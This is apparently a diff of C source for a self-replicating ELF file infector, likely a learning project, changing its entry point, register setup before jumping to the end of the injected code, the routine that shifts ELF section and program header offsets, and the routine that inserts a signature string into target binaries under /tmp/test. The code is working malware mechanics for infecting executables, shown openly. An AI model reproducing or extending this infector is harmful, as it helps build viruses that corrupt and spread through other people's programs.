@@ -26,7 +26,7 @@ static void end(void);
 static int  infectBins(const char *dirname);
 
 // TODO Payload must be aligned on 16
-int   entry_point(void) {
+int   entry_point(void *magic) {
   /* size_t  i; */
   // TODO Array of string
   char    infectDir[] = "/tmp/test";
@@ -39,16 +39,23 @@ int   entry_point(void) {
   /*     return (1); */
   /*   i += 1; */
   /* } */
+  if (magic == (void *)0x42)
+    return (0);
+  register int64_t rax2 asm("rax") = 0;
+  register int64_t rbx2 asm("rbx") = 0;
+  register int64_t rcx2 asm("rcx") = 0;
+  register int64_t rdx2 asm("rdx") = 0;
+  register int64_t rsi2 asm("rsi") = 0;
+  register int64_t rdi2 asm("rdi") = 0;
+  register int64_t r82 asm("r8") = 0;
+  register int64_t r92 asm("r9") = 0;
+  register int64_t r102 asm("r10") = 0;
+  register int64_t r112 asm("r11") = 0;
+  register int64_t r122 asm("r12") = 0;
+  register int64_t r132 asm("r13") = 0;
+  register int64_t r142 asm("r14") = 0;
+  register int64_t r152 asm("r15") = 0;
   asm("jmp endSC");
-  return (0);
-}
-
-static void  _exit(int status) {
-  asm("int3");
-}
-
-static void  exit(int status) {
-  asm("int3");
 }
 
 static int  write(int fd, const void *buf, size_t count) {
@@ -274,17 +281,17 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
       header->e_shoff += toAdd;
     i = 0;
     while (i < header->e_shnum) {
-        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
-        if (section->sh_offset > offset)
+        section = ((void *)header) + header->e_shoff + i * sizeof(Elf64_Shdr);
+        if (section->sh_offset >= offset)
             section->sh_offset += toAdd;
         i += 1;
     }
     i = 0;
     while (i < header->e_phnum) {
         program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
-        if (program->p_offset > offset)
+        if (program->p_offset >= offset)
             program->p_offset += toAdd;
-        if (program->p_paddr > offset)
+        if (program->p_paddr >= offset)
             program->p_paddr += toAdd;
         i += 1;
     }
@@ -307,6 +314,7 @@ static void  appendSignature(struct bfile file, size_t offset) {
 
   char payload[] = "HelloWorldaaaaa";
   toAdd = strlen(payload) + 1;
+  // TODO Lose 1 byte from comment section
   memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
   memcpy(((void *)file.header) + offset, payload, toAdd);
 }
